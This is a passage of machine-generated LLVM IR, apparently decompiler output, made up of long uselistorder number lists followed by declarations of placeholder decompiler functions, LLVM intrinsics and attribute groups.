586, 587, 22, 199, 200, 5, 201, 202, 203, 204, 205, 206, 207, 208, 148, 209, 210, 211, 169, 92, 797, 798, 799, 23, 63, 186, 83, 860, 711, 712, 713, 84, 800, 801, 802, 12, 13, 803, 804, 14, 16, 0, 1, 805, 806, 15, 807, 808, 809, 86, 173, 810, 811, 812, 813, 814, 85, 87, 815, 24, 816, 817, 6, 818, 819, 794, 287, 288, 289, 290, 291, 714, 715, 716, 717, 419, 420, 422, 732, 404, 405, 89, 90, 88, 820, 102, 292, 293, 72, 728, 96, 117, 352, 103, 144, 557, 558, 32, 104, 105, 839, 847, 848, 106, 107, 108, 294, 150, 295, 296, 849, 850, 852, 109, 855, 179, 857, 212, 851, 110, 111, 112, 297, 113, 298, 299, 25, 300, 301, 302, 303, 304, 305, 213, 214, 307, 114, 306, 26, 308, 309, 310, 311, 312, 313, 559, 161, 560, 162, 561, 562, 563, 564, 565, 566, 567, 314, 317, 170, 729, 171, 315, 316, 853, 854, 856, 336, 115, 215, 216, 217, 218, 421, 318, 319, 116, 320, 33, 321, 323, 858, 322, 324, 325, 326, 859, 329, 327, 328, 4, 330, 219, 122, 331, 332, 333, 27, 334, 337, 338, 339, 341, 220, 221, 123, 340, 28, 730, 342, 343, 349, 152, 350, 351, 344, 151, 348, 345, 30, 346, 29, 347, 222, 118, 223, 119, 120, 353, 354, 355, 356, 153, 154, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 406, 407, 408, 155, 156, 409, 121, 410, 411, 412, 413, 414, 415, 416, 417, 418, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 187, 188, 438, 439, 440, 441, 189, 190, 442, 443, 444, 445, 157, 158, 159, 446, 447, 448, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 643, 499, 500, 501, 502, 503, 507, 508, 509, 510, 511, 512, 160, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 644, 645, 646, 647, 648, 649, 650, 651, 164, 133, 718, 719, 720, 721, 722, 723, 731, 733, 134, 124, 139, 125, 135, 136, 137, 138, 126, 127, 128, 129, 130, 131, 132 }
  uselistorder void (i32)* @__pseudo_branch, { 29, 33, 30, 210, 211, 212, 31, 32, 34, 221, 222, 223, 224, 69, 70, 1, 2, 3, 4, 5, 6, 7, 225, 8, 9, 35, 213, 214, 215, 216, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 219, 220, 48, 49, 217, 218, 50, 71, 72, 228, 229, 230, 231, 138, 139, 140, 51, 151, 152, 153, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 249, 143, 144, 145, 232, 84, 85, 86, 87, 88, 89, 250, 251, 237, 238, 245, 247, 248, 246, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 0, 186, 187, 188, 90, 91, 92, 93, 94, 95, 189, 190, 191, 262, 268, 269, 263, 264, 265, 146, 147, 148, 239, 243, 244, 240, 241, 242, 142, 270, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 226, 227, 169, 170, 171, 149, 150, 126, 127, 233, 234, 235, 236, 96, 172, 173, 174, 175, 176, 177, 129, 130, 131, 132, 133, 134, 135, 136, 137, 178, 179, 180, 181, 182, 183, 184, 185, 141, 97, 98, 99, 100, 101, 102, 266, 103, 104, 10, 11, 105, 106, 107, 108, 109, 110, 111, 192, 112, 193, 194, 113, 195, 114, 115, 116, 117, 118, 119, 120, 121, 267, 12, 13, 122, 123, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 208, 207, 124, 14, 125, 128, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 209 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 327, 1312, 17, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 328, 329, 330, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 996, 19, 997, 18, 998, 999, 1000, 20, 78, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 1341, 1342, 1343, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 1354, 1355, 1356, 1357, 1358, 1361, 1362, 352, 353, 354, 355, 1363, 1364, 1001, 1005, 21, 5, 1030, 1031, 1032, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1365, 1366, 1367, 1368, 171, 172, 1369, 454, 465, 455, 456, 457, 458, 459, 464, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 460, 22, 461, 462, 463, 368, 369, 370, 371, 372, 173, 174, 175, 176, 177, 178, 179, 180, 181, 23, 182, 183, 184, 185, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1387, 1390, 1391, 476, 477, 1344, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 373, 374, 375, 376, 24, 377, 378, 379, 380, 381, 1345, 1346, 382, 383, 384, 385, 386, 387, 388, 1359, 1360, 389, 466, 467, 1392, 1393, 1394, 14, 1395, 1046, 25, 1047, 1048, 1049, 26, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1396, 1397, 1057, 1058, 1398, 1399, 1400, 489, 490, 491, 390, 391, 84, 879, 880, 881, 882, 27, 392, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 538, 539, 540, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 6, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 28, 1094, 1095, 1133, 1114, 1115, 1116, 1134, 1135, 1136, 1117, 1118, 1137, 1138, 1139, 1140, 1141, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 7, 1161, 79, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 29, 8, 406, 407, 408, 413, 414, 415, 416, 85, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 409, 30, 410, 411, 412, 427, 428, 430, 431, 429, 432, 433, 434, 435, 436, 437, 1485, 1486, 1487, 1488, 471, 472, 438, 439, 440, 441, 442, 443, 444, 445, 446, 449, 447, 31, 448, 450, 451, 452, 453, 468, 469, 470, 1489, 1490, 1491, 1496, 80, 473, 69, 474, 475, 478, 32, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 1492, 1493, 1494, 1495, 1162, 1163, 1527, 1528, 1006, 1007, 33, 9, 1008, 847, 848, 849, 850, 851, 852, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1119, 1120, 1121, 1122, 1123, 1124, 34, 1125, 1126, 1009, 1010, 1011, 1401, 1402, 35, 1403, 1404, 1405, 36, 1406, 37, 1407, 1408, 1409, 1410, 1411, 10, 1415, 0, 1416, 1417, 1412, 1418, 1, 1033, 1034, 1035, 1036, 1002, 1003, 1004, 1012, 1013, 1014, 38, 1015, 1016, 1017, 39, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 15, 502, 503, 504, 505, 506, 507, 1545, 1546, 947, 948, 949, 950, 951, 952, 953, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 81, 508, 509, 1388, 1389, 510, 511, 512, 513, 1497, 1524, 1525, 1526, 1554, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1555, 973, 974, 975, 186, 187, 188, 189, 190, 191, 957, 958, 959, 883, 884, 1556, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 1259, 1260, 1261, 1262, 1263, 1270, 1271, 528, 529, 1264, 1265, 1266, 1267, 1268, 1269, 524, 525, 526, 527, 530, 531, 1272, 1273, 1274, 1275, 1276, 1277, 1564, 1626, 532, 533, 534, 535, 1565, 1569, 1583, 1584, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 40, 1579, 1580, 1581, 1582, 1566, 1567, 1568, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 41, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1498, 1522, 1523, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 74, 1512, 1515, 2, 1516, 1517, 1518, 1519, 1520, 1521, 954, 955, 956, 677, 976, 536, 537, 1164, 1197, 1198, 1199, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 803, 804, 42, 805, 1200, 1201, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 43, 45, 568, 44, 569, 570, 1174, 1175, 1176, 1177, 1180, 3, 1178, 1179, 16, 70, 1181, 1186, 1187, 1182, 1183, 1184, 1185, 923, 46, 924, 925, 926, 75, 927, 928, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 47, 204, 205, 206, 207, 208, 209, 210, 48, 49, 211, 212, 50, 51, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1142, 1143, 1144, 1419, 1420, 1421, 1422, 52, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 76, 1430, 1431, 1432, 1433, 1434, 1211, 1212, 1213, 1214, 53, 1215, 1216, 1217, 54, 1127, 1128, 1129, 1218, 1219, 1220, 1384, 1385, 1386, 1221, 1222, 1223, 1130, 1131, 1132, 750, 751, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 55, 1477, 1478, 1479, 1480, 1481, 228, 229, 230, 1464, 1465, 82, 71, 1466, 1482, 1483, 1484, 1413, 1414, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 1224, 1225, 1226, 56, 1227, 57, 1228, 58, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 773, 83, 774, 72, 775, 776, 777, 778, 779, 780, 787, 788, 789, 1303, 1304, 1305, 1306, 761, 762, 763, 764, 765, 766, 767, 768, 1236, 1237, 1238, 583, 584, 585, 591, 592, 593, 594, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 586, 885, 886, 678, 1557, 1558, 1559, 1513, 1514, 587, 86, 588, 59, 589, 590, 1585, 1586, 60, 1587, 73, 1588, 595, 596, 597, 600, 598, 599, 231, 232, 233, 601, 61, 602, 1278, 1279, 1280, 1281, 1282, 1283, 87, 603, 604, 605, 606, 1589, 1590, 1591, 1596, 1597, 1598, 1605, 1608, 1609, 1592, 1593, 62, 1594, 1595, 607, 608, 609, 610, 611, 612, 11, 613, 614, 615, 616, 617, 12, 234, 235, 622, 623, 624, 618, 619, 63, 620, 621, 88, 625, 626, 236, 237, 1606, 1607, 627, 628, 629, 630, 631, 632, 633, 89, 634, 238, 90, 239, 240, 887, 888, 904, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 635, 636, 637, 638, 1284, 1285, 1286, 1293, 1294, 1295, 639, 640, 641, 679, 680, 681, 1287, 1288, 1289, 1290, 1291, 1292, 812, 813, 814, 815, 816, 817, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 1610, 1611, 1612, 1613, 1614, 1615, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 694, 695, 696, 697, 698, 699, 960, 961, 962, 963, 964, 965, 280, 281, 282, 283, 284, 285, 286, 287, 781, 782, 783, 784, 785, 786, 1599, 1600, 1601, 1602, 1603, 1604, 1247, 1248, 1249, 1250, 1251, 1252, 1239, 1240, 1241, 1242, 1243, 1244, 1253, 1254, 1255, 1256, 1257, 1258, 288, 289, 290, 291, 292, 293, 294, 295, 837, 838, 839, 840, 841, 842, 296, 297, 298, 299, 977, 978, 979, 980, 981, 982, 300, 301, 302, 303, 304, 305, 306, 307, 642, 643, 64, 644, 645, 65, 646, 66, 652, 653, 654, 655, 4, 656, 657, 647, 648, 649, 650, 651, 1616, 67, 1617, 1618, 1619, 1620, 1623, 1624, 1625, 1621, 1622, 658, 659, 660, 661, 662, 663, 664, 1560, 1561, 1562, 1563, 308, 309, 310, 311, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 682, 683, 684, 13, 312, 313, 689, 690, 691, 685, 686, 68, 687, 688, 1296, 1297, 1298, 1301, 1302, 1299, 1300, 692, 693, 91, 700, 713, 714, 715, 710, 711, 92, 701, 77, 702, 704, 703, 705, 706, 707, 708, 709, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 712, 716, 717, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 752, 753, 754, 755, 756, 757, 758, 759, 760, 769, 770, 771, 772, 790, 791, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 792, 793, 794, 795, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 796, 797, 798, 799, 800, 801, 802, 806, 807, 808, 809, 810, 811, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 843, 844, 845, 846, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 966, 967, 968, 969, 970, 971, 972, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 1245, 1246, 1307, 1308, 1309, 1310, 325, 326, 1311 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
